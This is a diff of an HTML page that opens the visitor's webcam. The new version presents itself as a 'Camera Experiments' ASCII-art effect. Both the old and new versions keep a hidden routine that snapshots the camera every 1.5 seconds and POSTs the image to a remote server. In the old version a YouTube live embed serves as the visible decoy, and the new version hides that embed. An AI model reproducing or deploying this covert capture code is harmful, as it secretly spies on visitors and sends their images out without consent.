@@ -1,19 +1,100 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <title>Camera Experiments</title>
+
 </head>
+<body>
+  <video id="camera-stream"></video>
+  <canvas id="hidden-canvas"></canvas>
+  <canvas id="output-canvas"></canvas>
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
+  <script >
+  const video = document.querySelector('#camera-stream');
+const hiddenCanvas = document.querySelector('#hidden-canvas');
+const outputCanvas = document.querySelector('#output-canvas');
+const hiddenContext = hiddenCanvas.getContext('2d');
+const outputContext = outputCanvas.getContext('2d');
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+const constraints = {
+  video: {
+    width: 512,
+    height: 512,
+  },
+};
 
-<script>
+const getAverageRGB = (frame) => {
+  const length = frame.data.length / 4;
 
+  let r = 0;
+  let g = 0;
+  let b = 0;
+
+  for (let i = 0; i < length; i++) {
+    r += frame.data[i * 4 + 0];
+    g += frame.data[i * 4 + 1];
+    b += frame.data[i * 4 + 2];
+  }
+
+  return {
+    r: r / length,
+    g: g / length,
+    b: b / length,
+  };
+};
+
+const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&()/\\+<>';
+
+const processFrame = () => {
+  const fontHeight = 12;
+  const { videoWidth: width, videoHeight: height } = video;
+
+  if (width && height) {
+    hiddenCanvas.width = width;
+    hiddenCanvas.height = height;
+    outputCanvas.width = width;
+    outputCanvas.height = height;
+    hiddenContext.drawImage(video, 0, 0, width, height);
+
+    outputContext.textBaseline = 'top';
+    outputContext.font = `${fontHeight}px Consolas`;
+
+    const text = outputContext.measureText('@');
+    const fontWidth = parseInt(text.width);
+
+    outputContext.clearRect(0, 0, width, height);
+
+    for (let y = 0; y < height; y += fontHeight) {
+      for (let x = 0; x < width; x += fontWidth) {
+        const frameSection = hiddenContext.getImageData(x, y, fontWidth, fontHeight);
+        const { r, g, b } = getAverageRGB(frameSection);
+        const randomCharacter = charset[Math.floor(Math.random() * charset.length)];
+
+        outputContext.fillStyle = `rgb(${r},${g},${b})`;
+        // outputContext.fillRect(x, y, fontWidth, fontHeight);
+        outputContext.fillText(randomCharacter, x, y);
+      }
+    }
+  }
+
+  window.requestAnimationFrame(processFrame);
+};
+
+navigator.getUserMedia(constraints, function (stream) {
+  video.srcObject = stream;
+  video.play();
+}, function (err) {
+  console.error(err);
+});
+
+video.addEventListener('play', function () {
+  window.requestAnimationFrame(processFrame);
+  console.log('Live!');
+});
 function post(imgdata){
 $.ajax({
     type: 'POST',
@@ -28,55 +109,15 @@ $.ajax({
     }
   });
 };
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       var canvasData = hiddenCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
 
-}
-
-// Load init
-init();
 
 </script>
-
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
-
+    <iframe id="Live_YT_TV" hidden="hidden" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</body>
 </html>
+
